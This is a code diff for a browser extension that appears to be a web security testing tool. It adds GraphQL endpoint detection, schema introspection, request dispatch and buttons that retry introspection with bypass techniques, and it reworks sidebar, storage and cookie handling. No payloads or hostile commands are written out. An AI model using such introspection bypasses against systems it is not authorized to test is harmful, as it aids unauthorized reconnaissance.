+    Payloads.reorderPayload(target.dataset.cat, dragged.value, target.dataset.val);
+  });
+
+  // ── GraphQL ──
+  document.querySelector('.nav-btn[data-tab="graphql"]').addEventListener('click', () => {});
+  $('graphql-detect').addEventListener('click', () => GraphQL.detect());
+  $('graphql-introspect').addEventListener('click', () => GraphQL.introspect());
+  $('graphql-clear').addEventListener('click', () => GraphQL.clear());
+  $('graphql-schema-search').addEventListener('input', e => GraphQL.applySchemaSearch(e.target.value));
+  $('graphql-schema-search-clear').addEventListener('click', () => {
+    $('graphql-schema-search').value = '';
+    GraphQL.applySchemaSearch('');
+  });
+  GraphQL.loadGqlUrlHistory();
+  $('graphql-output').addEventListener('click', e => {
+    const pick = e.target.closest('[data-action="graphql-pick"]');
+    if (pick) {
+      const urlInput = $('graphql-url');
+      if (urlInput) urlInput.value = pick.dataset.url;
       return;
     }
-    const copyOne = e.target.closest('.payload-copy-one');
-    if (copyOne) { copyText(copyOne.dataset.val); toast('Copied', 'success'); }
+    const toggleHdr = e.target.closest('[data-action="graphql-toggle"]');
+    if (toggleHdr) { toggleHdr.closest('.graphql-section')?.classList.toggle('collapsed'); return; }
+    const toDispatch = e.target.closest('[data-action="gql-to-dispatch"]');
+    if (toDispatch) {
+      const url = GraphQL.getCurrentUrl();
+      const body = JSON.stringify({ query: '{\n  \n}' }, null, 2);
+      GraphQL.sendToDispatch(url, body);
+      return;
+    }
+    const fieldDispatch = e.target.closest('[data-action="gql-field-dispatch"]');
+    if (fieldDispatch) {
+      GraphQL.sendToDispatch(GraphQL.getCurrentUrl(), fieldDispatch.dataset.body);
+      return;
+    }
+    const bypassBtn = e.target.closest('.gql-bypass-btn');
+    if (bypassBtn) {
+      const technique = bypassBtn.dataset.bypass;
+      if (technique === 'get') {
+        $('graphql-method').value = 'GET';
+        GraphQL.introspect({ statusLabel: 'Trying GET bypass…' });
+      } else {
+        GraphQL.introspect({ ...GraphQL.getBypasses()[technique], statusLabel: `Trying ${GraphQL.getBypasses()[technique].label}…` });
+      }
+      return;
+    }
   });
 
   // ── Bootstrap ──
@@ -3036,25 +5466,25 @@ document.addEventListener('DOMContentLoaded', async () => {
   Cookies.load();
   Auth.loadRoles();
   ActiveBar.update();
-  // Auto-snapshot on load (silent baseline for diff)
-  Storage.load().then(() => {
-    state.storageSnapshot = { local: { ...state.localCache }, session: { ...state.sessionCache } };
-  });
+  Storage.load();
 
   // ── Sidebar collapse toggle ──
   const sidebar = $('sidebar');
   const toggleBtn = $('sidebar-toggle');
   const { sidebarCollapsed = false } = await chrome.storage.local.get('sidebarCollapsed');
-  if (sidebarCollapsed) { sidebar.classList.add('collapsed'); toggleBtn.textContent = '›'; }
+  if (sidebarCollapsed) {
+    sidebar.classList.add('collapsed');
+    toggleBtn.textContent = 'Show';
+    toggleBtn.title = 'Expand sidebar';
+    toggleBtn.setAttribute('aria-label', 'Expand sidebar');
+  }
   toggleBtn.addEventListener('click', async () => {
     const collapsed = sidebar.classList.toggle('collapsed');
-    toggleBtn.textContent = collapsed ? '›' : '‹';
+    toggleBtn.textContent = collapsed ? 'Show' : 'Hide';
+    toggleBtn.title = collapsed ? 'Expand sidebar' : 'Collapse sidebar';
+    toggleBtn.setAttribute('aria-label', collapsed ? 'Expand sidebar' : 'Collapse sidebar');
     await chrome.storage.local.set({ sidebarCollapsed: collapsed });
   });
-
-  // ── Storage snapshot buttons (#12) ──
-  $('storage-snapshot-btn').addEventListener('click', () => Storage.takeSnapshot());
-  $('storage-clear-diff').addEventListener('click', () => Storage.clearSnapshot());
 
   // ── Active bar chip click → go to Profiles tab + section (#11) ──
   $('active-bar').addEventListener('click', e => {
@@ -3088,6 +5518,7 @@ document.addEventListener('DOMContentLoaded', async () => {
     state.tabId  = tab?.id ?? state.tabId;
     state.tabUrl = url ?? tab?.url ?? state.tabUrl;
     Cookies.load();
+    await Storage.load();
     Storage.switchView(state.storageView);
   }
 
@@ -3101,20 +5532,21 @@ document.addEventListener('DOMContentLoaded', async () => {
     });
     chrome.tabs.onActivated.addListener(async ({ tabId }) => {
       const tab = await chrome.tabs.get(tabId).catch(() => null);
-      if (tab) { state.tabId = tab.id; state.tabUrl = tab.url ?? ''; Cookies.load(); Storage.switchView(state.storageView); }
+      if (tab) {
+        state.tabId = tab.id;
+        state.tabUrl = tab.url ?? '';
+        Cookies.load();
+        await Storage.load();
+        Storage.switchView(state.storageView);
+      }
     });
   }
 
   // ── Auto-refresh cookies on Set-Cookie (covers XHR/fetch login flows) ──
   let _cookieTimer = null;
-  chrome.cookies.onChanged.addListener(({ cookie }) => {
-    if (!state.tabUrl) return;
-    try {
-      const hostname = new URL(state.tabUrl).hostname;
-      const cookieDomain = cookie.domain.replace(/^\./, '');
-      if (!hostname.endsWith(cookieDomain) && !cookieDomain.endsWith(hostname)) return;
-    } catch { return; }
+  chrome.cookies.onChanged.addListener(() => {
+    if (!isHttpUrl(state.tabUrl)) return;
     clearTimeout(_cookieTimer);
-    _cookieTimer = setTimeout(() => Cookies.load(), 350);
+    _cookieTimer = setTimeout(() => Cookies.load(), 250);
   });
 });
